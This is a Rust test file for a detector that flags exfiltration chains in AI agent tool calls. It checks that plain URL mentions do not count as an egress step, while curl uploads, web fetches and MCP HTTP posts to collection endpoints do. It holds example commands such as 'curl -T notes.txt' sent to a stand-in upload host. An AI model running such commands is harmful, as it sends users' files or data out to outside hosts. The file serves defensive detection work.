use super::*;

#[test]
fn a_url_named_in_text_does_not_supply_the_egress_step_of_a_chain() {
    for mention in [
        text_result(
            "mention",
            "See https://docs.darkroastcyber.io/guide for setup.",
        ),
        body(
            "mention",
            ObservationBody::Message(
                MessageObservation::new(MessageRole::Assistant).with_content(JsonValue::string(
                    "The guide is at https://docs.darkroastcyber.io/guide.",
                )),
            ),
            ObservationStage::MessageObserved,
        ),
    ] {
        // On its own the mention raises only the zero-point reference rule.
        let output = actions(std::slice::from_ref(&mention));
        let session = &output.sessions()[0];
        assert_eq!(
            session.rule_ids(),
            ["network.controlled_test_domain.mention"]
        );
        assert_eq!(session.rule_score(), 0);
        // The native action view reads the same reference and nothing more.
        let native = session
            .action_findings()
            .iter()
            .map(|finding| finding.rule_ids().to_vec())
            .collect::<Vec<_>>();
        assert_eq!(native, [["network.controlled_test_domain.mention"]]);
        for (opener, chain) in egress_chain_openers() {
            assert_eq!(
                chain_in_both_views(&[opener, mention.clone()], chain),
                (false, false),
                "{chain}"
            );
        }
    }
}

#[test]
fn a_network_command_still_supplies_the_egress_step_of_a_chain() {
    let upload = "curl -T notes.txt https://example.invalid/upload";
    for (opener, chain) in egress_chain_openers() {
        assert_eq!(
            chain_in_both_views(&[opener, parsed_shell_call("egress", upload)], chain),
            (true, true),
            "{chain}"
        );
    }
}

#[test]
fn a_web_fetch_of_the_controlled_domain_supplies_the_egress_step_of_a_chain() {
    let fetch = serde_json::json!({
        "url": "https://in.darkroastcyber.io/collect",
        "prompt": "summarize"
    });
    for (opener, chain) in egress_chain_openers() {
        assert_eq!(
            chain_in_both_views(
                &[opener, url_call("egress", "WebFetch", fetch.clone())],
                chain
            ),
            (true, true),
            "{chain}"
        );
    }
}

#[test]
fn an_mcp_http_call_to_the_controlled_domain_supplies_the_egress_step_of_a_chain() {
    let post = serde_json::json!({
        "endpoint": "https://in.darkroastcyber.io/collect",
        "body": "status"
    });
    for (opener, chain) in egress_chain_openers() {
        assert_eq!(
            chain_in_both_views(
                &[opener, url_call("egress", "mcp__http__post", post.clone())],
                chain
            ),
            (true, true),
            "{chain}"
        );
    }
}

#[test]
fn a_custom_exfiltration_rule_on_a_tool_name_supplies_the_egress_step() {
    let plan = custom_exfiltration_plan();
    let send = url_call("send", "send_report", serde_json::json!({"to": "team"}));
    assert_eq!(
        chain_in_both_views_with(
            &plan,
            &[parsed_shell_call("open", "printf opener-marker"), send],
            "chain.synthetic_open_then_send"
        ),
        (true, true)
    );
}

#[test]
fn a_custom_exfiltration_rule_on_a_tool_name_or_url_supplies_the_egress_step() {
    let plan = custom_exfiltration_plan();
    let post = url_call("post", "post_report", serde_json::json!({"to": "team"}));
    assert_eq!(
        chain_in_both_views_with(
            &plan,
            &[parsed_shell_call("open", "printf opener-marker"), post],
            "chain.synthetic_open_then_send"
        ),
        (true, true)
    );
}

#[test]
fn a_request_to_the_controlled_domain_supplies_the_egress_step_of_a_chain() {
    let request = "curl https://in.darkroastcyber.io/collect";
    for (opener, chain) in egress_chain_openers() {
        assert_eq!(
            chain_in_both_views(&[opener, parsed_shell_call("egress", request)], chain),
            (true, true),
            "{chain}"
        );
    }
}
